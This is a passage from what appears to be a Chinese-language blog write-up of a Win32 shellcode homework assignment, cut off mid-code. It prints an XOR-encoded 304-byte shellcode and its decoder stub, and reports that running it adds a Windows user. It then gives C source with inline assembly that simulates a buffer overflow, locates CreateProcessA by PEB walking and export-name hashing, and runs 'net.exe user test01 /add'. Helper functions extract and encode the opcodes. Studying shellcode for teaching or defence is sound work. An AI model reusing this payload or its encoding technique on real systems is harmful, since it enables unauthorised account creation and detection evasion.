class="string">&quot;\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd\x2e\xb9&quot;</span></span><br><span class="line"><span class="string">&quot;\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&quot;</span>;</span><br><span class="line">Success: encode is OK</span><br><span class="line">length of shellcode = <span class="number">304</span> = <span class="number">0x130</span></span><br><span class="line"><span class="comment">// 将解码程序放到shellcode里面，生成一个实用的shellcode</span></span><br><span class="line"><span class="comment">/* 304=0x130 bytes */</span></span><br><span class="line"><span class="string">&quot;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x19\x01\x80\x34\x0b\xfe\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xfa\xc3\xe8\xeb\xff\xff\xff\x94\xfe\x96\xd1\x9f\x9a\x9a\x96\x8a&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\xcf\xde\x96\xde\x8a\x9b\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b\x86&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\xde\x96\x90\x9b\x8a\xd0\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d&quot;</span></span><br><span class="line"><span class="string">&quot;\x77\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e&quot;</span></span><br><span class="line"><span class="string">&quot;\xa4\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9&quot;</span></span><br><span class="line"><span class="string">&quot;\xee\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1&quot;</span></span><br><span class="line"><span class="string">&quot;\xa0\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8&quot;</span></span><br><span class="line"><span class="string">&quot;\xde\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd&quot;</span></span><br><span class="line"><span class="string">&quot;\x3d\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\xf9\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9&quot;</span></span><br><span class="line"><span class="string">&quot;\xf5\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&quot;</span></span><br></pre></td></tr></table></figure>
<p>​    截图如下所示：</p>
<p><img src="/images/win32-shellcode-homework/image-20221130162143338.png" alt="image-20221130162143338" style="zoom:67%;" /></p>
<p>​    可以看到，运行完<code>GetShellcode_xcl.exe</code>后，直接运行<code>net user</code>，发现已经添加成功。</p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>​    完整的GetShellcode_xcl.cpp代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OPCODE_LEN  0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  模拟缓冲区溢出漏洞，并用shellcode进行攻击. Do not use ((void (*)())code)();</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">doShellcode</span><span class="params">(<span class="type">char</span> * code)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">    begin_proc:</span><br><span class="line">        call    vul_function;    <span class="comment">// call vulnerabile function</span></span><br><span class="line">        jmp     code;   <span class="comment">// do the shellcode</span></span><br><span class="line">        jmp     end_proc;</span><br><span class="line">      vul_function:</span><br><span class="line">        ret;    <span class="comment">// now, the buffer is overflow, and ret to the shellcode</span></span><br><span class="line">    end_proc:;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> decode1[] =</span><br><span class="line"><span class="string">&quot;\xeb\x0e\x5b\x53\x4b\x33\xc9\xb1\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x34\x0b\xee\xe2\xfa\xc3\xe8\xed\xff\xff\xff&quot;</span>;</span><br><span class="line"><span class="type">char</span> decode2[] =</span><br><span class="line"><span class="string">&quot;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\xdd\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x34\x0b\xee\xe2\xfa\xc3\xe8\xeb\xff\xff\xff&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EIGHT_NOPS __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\</span></span><br><span class="line"><span class="meta">                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_BEGIN  EIGHT_NOPS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_END    EIGHT_NOPS</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">doCommandLineAsm</span><span class="params">()</span></span><br><span class="line"><span class="comment">//  hash(CreateProcessA)=0x6ba6bcc9</span></span><br><span class="line"><span class="comment">//  Addr=0x7C823E8F	hash=0xff0d6657	name=CloseHandle</span></span><br><span class="line"><span class="comment">//  0185: 	Addr=0x7C826919	hash=0x4fd18963	name=ExitProcess</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> lMyAddress;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        	jmp near  next_call;</span><br><span class="line">        proc001:</span><br><span class="line">	    	ret;</span><br><span class="line">        next_call:</span><br><span class="line">      		call    proc001;</span><br><span class="line">        	mov     eax,[esp<span class="number">-4</span>];<span class="comment">//获得这条指令的地址</span></span><br><span class="line">        	mov     lMyAddress,eax;</span><br><span class="line">    &#125;	<span class="comment">//  lMyAddress=指令mov eax,[esp-4];的地址</span></span><br><span class="line">    <span class="keyword">return</span> lMyAddress;</span><br><span class="line"></span><br><span class="line">    __asm&#123;</span><br><span class="line">    	PROC_BEGIN;     <span class="comment">// Begin of the code</span></span><br><span class="line">            push    <span class="number">00000000</span>h   ;</span><br><span class="line">            push    <span class="number">6464612f</span>h   ;</span><br><span class="line">            push    <span class="number">20313074</span>h   ;</span><br><span class="line">            push    <span class="number">73657420</span>h   ;</span><br><span class="line">            push    <span class="number">72657375</span>h   ;</span><br><span class="line">            push    <span class="number">20657865</span>h   ;</span><br><span class="line">            push    <span class="number">2e74656</span>eh   ; <span class="string">&quot;net.exe user test01 /add&quot;</span></span><br><span class="line">            mov     edi, esp    ; edi=<span class="string">&quot;net.exe user test01 /add&quot;</span></span><br><span class="line">            push    <span class="number">0xff0d6657</span>  ; <span class="comment">//hash(&quot;CloseHandle&quot;)=0xff0d6657</span></span><br><span class="line">            push    <span class="number">0x4fd18963</span>  ; <span class="comment">//hash(&quot;ExitProcess&quot;)=0x4fd18963</span></span><br><span class="line">            push    <span class="number">0x6ba6bcc9</span>  ; <span class="comment">//hash(CreateProcessA)=0x6ba6bcc9</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Begin: Get the process address for call+++++++++++++++++</span></span><br><span class="line">            pop     edx;        ; <span class="comment">//edx=GetHash(&quot;CreateProcessA&quot;);</span></span><br><span class="line">            call    findHashFuncAddrProc;   <span class="comment">// eax=address of function</span></span><br><span class="line">            <span class="comment">//mov     lFunctionPtr,eax;       // store address to lFunctionPtr</span></span><br><span class="line">            mov     esi,eax;    ;<span class="comment">// esi=CreateProcessA</span></span><br><span class="line">            pop     edx;        ;<span class="comment">// edx=GetHash(&quot;ExitProcess&quot;);</span></span><br><span class="line">            <span class="comment">//  call some functions to do the job.</span></span><br><span class="line">            call    findHashFuncAddrProc;   <span class="comment">// eax=address of function</span></span><br><span class="line">            <span class="comment">//mov     lFunctionPtr,eax;     // store address to lFunctionPtr</span></span><br><span class="line">            mov     ebx,eax;    ;<span class="comment">// ebx=CloseHandle</span></span><br><span class="line">            <span class="comment">// End: Get the process address for call ----------------</span></span><br><span class="line">            call    doCommandProc;          <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">            jmp     end_of_this_function;    <span class="comment">// finish all job. </span></span><br><span class="line">   </span><br><span class="line">        <span class="comment">// Define some sub processes here.  ===========================================</span></span><br><span class="line">        <span class="comment">// begin of doCommandProc    =====================================</span></span><br><span class="line">        <span class="comment">// in: edi=szCmdLine, esi=procAddr. out: eax=return value, result of call</span></span><br><span class="line">    	doCommandProc:</span><br><span class="line">            push    ecx;</span><br><span class="line">            push    edx;</span><br><span class="line">            push    esi;</span><br><span class="line">            push    edi;</span><br><span class="line">            push    ebp;</span><br><span class="line">            mov     ebp,esp;</span><br><span class="line"></span><br><span class="line">            mov     edx,edi;    <span class="comment">//edx=szCmdLine</span></span><br><span class="line">            sub     esp, <span class="number">54</span>h;</span><br><span class="line">            mov     edi, esp;</span><br><span class="line">            push    <span class="number">14</span>h;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            xor     eax,eax;</span><br><span class="line">            stack_zero:</span><br><span class="line">            mov     [edi+ecx*<span class="number">4</span>], eax;</span><br><span class="line">            loop    stack_zero;</span><br><span class="line">            mov     byte ptr [edi+<span class="number">10</span>h], <span class="number">44</span>h; si.cb = <span class="keyword">sizeof</span>(si)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            lea     eax, [edi+<span class="number">10</span>h]</span><br><span class="line">            push    edi;    <span class="comment">//push    piPtr;</span></span><br><span class="line">            push    eax;    <span class="comment">//push    siPtr;</span></span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="number">0</span>;</span><br><span class="line">            push    FALSE;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    edx;    <span class="comment">//edx=szCmdLine</span></span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            call    esi;    <span class="comment">//eax=return value;ptrCreateProcessA;</span></span><br><span class="line">            cmp     eax,<span class="number">0</span>;</span><br><span class="line">            je     donot_closehandle;</span><br><span class="line">            push    eax;</span><br><span class="line">            call    ebx;    <span class="comment">//ExitProcess;</span></span><br><span class="line">      	donot_closehandle:</span><br><span class="line">            mov     esp,ebp;</span><br><span class="line">            pop     ebp;</span><br><span class="line">            pop     edi;</span><br><span class="line">            pop     esi;</span><br><span class="line">            pop     edx;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            retn;</span><br><span class="line">        <span class="comment">// end of doCommandProc  ==================================</span></span><br><span class="line">        <span class="comment">// begin of findHashFuncAddrProc    ==============================</span></span><br><span class="line">        <span class="comment">// in: ecx = DLL nIndex, edx=lHash. out: eax=return value</span></span><br><span class="line">        findHashFuncAddrProc:</span><br><span class="line">            push    esi;</span><br><span class="line">            push    ebx;</span><br><span class="line">            push    ecx;</span><br><span class="line">            push    edx;</span><br><span class="line">            call    get_base_address;</span><br><span class="line">            cmp     eax,<span class="number">0</span>   ;   <span class="comment">// the base address is 0, done.</span></span><br><span class="line">            jle     end_of_findHashFuncAddrProc; <span class="keyword">if</span> ecx &lt;=<span class="number">0</span> done.</span><br><span class="line">            mov     ebx,eax ;   <span class="comment">// save the base to ebx;</span></span><br><span class="line">            call    get_function_addr;</span><br><span class="line">        end_of_findHashFuncAddrProc:</span><br><span class="line">            pop     edx;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            pop     ebx;</span><br><span class="line">            pop     esi;</span><br><span class="line">            retn;</span><br><span class="line">        <span class="comment">// end of findHashFuncAddrProc  ==================================</span></span><br><span class="line">        <span class="comment">// begin of get_base_address    ==================================</span></span><br><span class="line">        <span class="comment">// get_base_address: put the DLL nIndex to ecx. eax=return value</span></span><br><span class="line">        get_base_address:</span><br><span class="line">            mov     eax, fs:<span class="number">30</span>h     ; PEB base</span><br><span class="line">            mov     eax, [eax+<span class="number">0</span>ch]  ; PEB_LER_DATA</span><br><span class="line">            <span class="comment">// base of first element</span></span><br><span class="line">            mov     eax,[eax+<span class="number">1</span>ch]  ; The first element of InInitOrderModuleList</span><br><span class="line">            mov     eax,[eax]       ; Next element</span><br><span class="line">            mov     eax,[eax+<span class="number">8</span>]     ; eax = Base address of the module</span><br><span class="line">            retn;</span><br><span class="line">        <span class="comment">// end of get_base_address  ======================================</span></span><br><span class="line">        <span class="comment">// begin of get_function_addr    =================================</span></span><br><span class="line">        <span class="comment">// get_function_addr, in: ebx=base, edx=hash(name); out:eax=return value</span></span><br><span class="line">        get_function_addr:</span><br><span class="line">            <span class="comment">// get the addrs of first function =========</span></span><br><span class="line">            mov     eax,[ebx+<span class="number">3</span>ch]       ; e_lfanew</span><br><span class="line">            mov     eax,[eax+ebx+<span class="number">78</span>h]   ; DataDirectory[<span class="number">0</span>]</span><br><span class="line">            add     eax,ebx             ; RVA + base</span><br><span class="line">            mov     esi,eax             ; Save first DataDirectory to esi</span><br><span class="line">            mov     ecx,[esi+<span class="number">18</span>h]       ; NumberOfNames</span><br><span class="line">        compare_names_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">20</span>h]      ; AddressOfNames RVA</span><br><span class="line">            add     eax, ebx            ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]  ; NamesAddress RVA</span><br><span class="line">            add     eax, ebx            ; rva2va, now eax store the address of the name</span><br><span class="line"></span><br><span class="line">            push    edi                     ; save edi to <span class="built_in">stack</span></span><br><span class="line">            mov     edi,eax                 ; put the address of the <span class="built_in">string</span> to edi</span><br><span class="line">            call    hash_proc;              ; gethash</span><br><span class="line">            pop     edi                     ; restor edi from <span class="built_in">stack</span></span><br><span class="line">        </span><br><span class="line">            cmp     eax,edx;                ; compare to hash;</span><br><span class="line">            je      done_find_hash;</span><br><span class="line"></span><br><span class="line">        loop compare_names_hash;</span><br><span class="line">            xor     eax,eax;</span><br><span class="line">            jmp     done_get_function_addr;</span><br><span class="line">        done_find_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">1</span>ch]          ; AddressOfFunctions RVA</span><br><span class="line">            add     eax, ebx                ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]      ; FunctionAddress RVA</span><br><span class="line">            add     eax, ebx       ; rva2va, now eax store the address of the Function</span><br><span class="line">        done_get_function_addr:</span><br><span class="line">            retn;</span><br><span class="line">    	<span class="comment">// end of get_function_addr ======================================</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">// begin of hash_process    ======================================</span></span><br><span class="line">        <span class="comment">//hash_proc: you should put the address of the string to edi</span></span><br><span class="line">        <span class="comment">//when ret, the hash value stores in eax</span></span><br><span class="line">        hash_proc:</span><br><span class="line">            <span class="comment">// save ebx,ecx,edx,edi</span></span><br><span class="line">            push    ebx         ;</span><br><span class="line">            push    ecx         ;</span><br><span class="line">            push    edx         ;</span><br><span class="line">            push    edi         ;</span><br><span class="line">            xor     edx,edx     ; edx = h</span><br><span class="line">        hash_loop:              ;</span><br><span class="line">            movsx   eax,byte ptr [edi]  ; [eax]=*c ==&gt; eax</span><br><span class="line">            cmp     eax,<span class="number">0</span>       ;</span><br><span class="line">            je  exit_hash_proc  ;</span><br><span class="line">            mov     ebx,edx     ;  h ==&gt; ebx</span><br><span class="line">            mov     ecx,edx     ;  h ==&gt; ecx</span><br><span class="line">            shl     ebx,<span class="number">19</span>h     ; h &lt;&lt; <span class="number">25</span></span><br><span class="line">            shr     ecx,<span class="number">7</span>       ; h &gt;&gt; <span class="number">7</span></span><br><span class="line">            or      ebx,ecx     ; (h &lt;&lt; <span class="number">25</span>) | (h &gt;&gt; <span class="number">7</span>)</span><br><span class="line">            mov     edx,ebx     ;</span><br><span class="line">            add     edx,eax     ;</span><br><span class="line">            inc     edi;        ;</span><br><span class="line">            jmp hash_loop       ;</span><br><span class="line">        exit_hash_proc:         ;</span><br><span class="line">            mov     eax,edx     ; save hash to eax</span><br><span class="line">            <span class="comment">// restore ebx,ecx,edx,edi</span></span><br><span class="line">            pop     edi         ;</span><br><span class="line">            pop     edx         ;</span><br><span class="line">            pop     ecx         ;</span><br><span class="line">            pop     ebx         ;</span><br><span class="line">            retn                ;</span><br><span class="line">        <span class="comment">// end of hash_process    ========================================</span></span><br><span class="line">        end_of_this_function:</span><br><span class="line">            PROC_END;   <span class="comment">// End of the code</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> lMyAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintStrCode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *lpBuff, <span class="type">int</span> buffsize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;    </span><br><span class="line">    <span class="type">char</span> *p;    </span><br><span class="line">    <span class="type">char</span> msg[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/* %d=0x%x bytes */\n&quot;</span>,buffsize,buffsize);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;buffsize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((i%<span class="number">16</span>)==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\&quot;\n\&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%.2x&quot;</span>,lpBuff[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\&quot;;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">EncOpcode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * Opcode_buff, <span class="type">int</span> opcode_len, <span class="type">unsigned</span> <span class="type">char</span> xorByte)</span></span><br><span class="line"><span class="comment">//  in: Opcode_buff,opcode_len,xorByte; </span></span><br><span class="line"><span class="comment">//  out: encoded Opcode_buff</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(xorByte==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;The xorByte cannot be zero.&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;opcode_len;i++)&#123;</span><br><span class="line">        Opcode_buff[i]=Opcode_buff[i]^xorByte;</span><br><span class="line">    &#125;</span><br><span class="line">    Opcode_buff[opcode_len]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> opcode_len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetProcOpcode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * funPtr, <span class="type">unsigned</span> <span class="type">char</span>  * Opcode_buff)</span></span><br><span class="line"><span class="comment">//  in: funPtr; out: &quot;return value=length of Opcode_buff&quot; and Opcode_buff</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>  *fnbgn_str=<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>;</span><br><span class="line">    <span class="type">char</span>  *fnend_str=<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i,sh_len;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;MAX_OPCODE_LEN;i++ ) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>((<span class="type">unsigned</span> <span class="type">char</span>  *)(funPtr+i),fnbgn_str, <span class="number">8</span>)==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    funPtr+=(i+<span 